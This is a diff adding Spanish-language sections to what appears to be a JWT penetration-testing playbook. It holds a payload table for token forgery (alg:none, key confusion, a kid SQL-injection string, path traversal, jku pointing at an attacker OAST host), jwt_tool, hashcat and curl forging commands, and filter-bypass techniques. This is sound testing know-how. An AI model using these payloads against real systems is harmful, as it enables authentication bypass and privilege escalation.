@@ -167,6 +167,61 @@ chains_with: [auth-bypass, idor, ssrf]
 - `openssl` — keypair generation for the jku/x5u forgery technique.
 - `curl` — submitting forged tokens against the live target to confirm acceptance.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por primitiva de forja. Cada variante se confirma forjando un token y
+verificando aceptación en vivo (status 200 + contenido autenticado); la sola observación del header
+es Inferred.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| alg:none | header `{"alg":"none"}` + payload editado + firma vacía (`hdr.pld.`) | Omitir verificación de firma por completo |
+| HS256 weak secret | token HS256 → crack offline (`rockyou`), re-firmar con el secreto | Forjar claims con secreto recuperado |
+| RS256→HS256 confusion | header `{"alg":"HS256"}` firmado con la clave pública RSA como clave HMAC | Verificador genérico acepta símetrico con clave pública |
+| kid path traversal | `kid: "../../../../dev/null"` (o archivo de contenido conocido) | La clave sale de un archivo predecible → firmar con ese valor |
+| kid SQLi | `kid: "x' UNION SELECT 'known_secret'--"` | Inyectar el material de clave vía la query de lookup |
+| jku/x5u injection | `jku: "https://TOKEN.oast.site/jwks.json"` con JWKS propio | Apuntar la verificación a una clave atacante |
+| Claim tampering | editar `role`/`isAdmin`/`user_id`, firma original intacta | Detectar firma no verificada (solo decodifica) |
+| Expiry/replay | token con `exp` pasado o `exp` removido/extendido | Reutilizar o perpetuar sesión sin enforcement |
+
+Surface signals que delatan la clase antes de forjar:
+- Triple `header.payload.signature` base64url separado por puntos en `Authorization: Bearer`, cookie o body post-login.
+- Header decodificado con `"alg":"HS256"` (símetrico, brute-forceable y candidato a confusion) o campos `kid`/`jku`/`x5u`.
+- Payload con claims de autorización (`role`, `isAdmin`, `scope`, `user_id`) forjables → privilegio directo.
+- Clave pública alcanzable en `/.well-known/jwks.json`, cert TLS o JS/binario de cliente → habilita RS256→HS256.
+- JWTs en `wayback-urls.txt`/query strings (grep `eyJ[A-Za-z0-9_-]{10,}\.`) → exposición en logs/referer antes de cualquier forja.
+
+```bash
+# triage: decodificar header/payload y probar alg:none (marcador único en un claim para dedup)
+jwt_tool "$TOKEN"                                  # decode + checks básicos
+jwt_tool "$TOKEN" -X a                             # construye variante alg:none
+curl -s -o /dev/null -w '%{http_code}\n' https://target/api/profile \
+  -H "Authorization: Bearer $FORGED"               # 200 + contenido auth = alg:none aceptado
+```
+
+```bash
+# crack offline (no toca el target hasta confirmar el secreto) + forja
+hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt
+jwt_tool "$TOKEN" -S hs256 -p "found_secret" -T    # re-firmar con claims elevados
+curl -s https://target/api/admin/users -H "Authorization: Bearer $FORGED"
+```
+
+## Bypass Techniques
+
+Agrupadas por el control que evaden; probar la familia completa antes de declarar no-forjable.
+Un `jku`/`x5u` apuntando a infra propia es un vector ciego: la confirmación del fetch pasa por el
+gate OOB (callback con token vía `engine.oast`).
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Rechazo de `alg:none` | Variar casing/encoding: `None`, `nOnE`, `NONE`, null byte en el valor | Comparación case-sensitive ingenua del string `none` |
+| Pinning de algoritmo | RS256→HS256 cuando el verify no fija `algorithms:['RS256']` | Requiere tener la clave pública en mano |
+| Firma verificada | Tamper de claim con firma intacta; probar primero (más barato) | Detecta código que solo decodifica, no verifica |
+| Sanitización de `kid` | Path traversal a archivo conocido, SQLi en la query de lookup | Firmar luego con el valor que el lookup resolverá |
+| Allowlist de `jku`/`x5u` | Open-redirect/SSRF a host confiable, `@`/`#` en la URL, host propio con JWKS | Discrepancia validador-vs-fetcher; demostrar el fetch por OAST |
+| Enforcement de `exp` | Remover/extender `exp`, token viejo capturado replayado | Verificar aceptación de token no-expirado fresco, no solo del expirado |
+| WAF/rechazo de header largo | Mover JWT a cookie si solo se filtra `Authorization`, variantes de prefijo (`Bearer `/`JWT `) | El servidor suele aceptar el token en más de un transporte |
+
 ## Root Causes
 
 - JWT library/verification code accepting the `alg` value from the token itself rather than
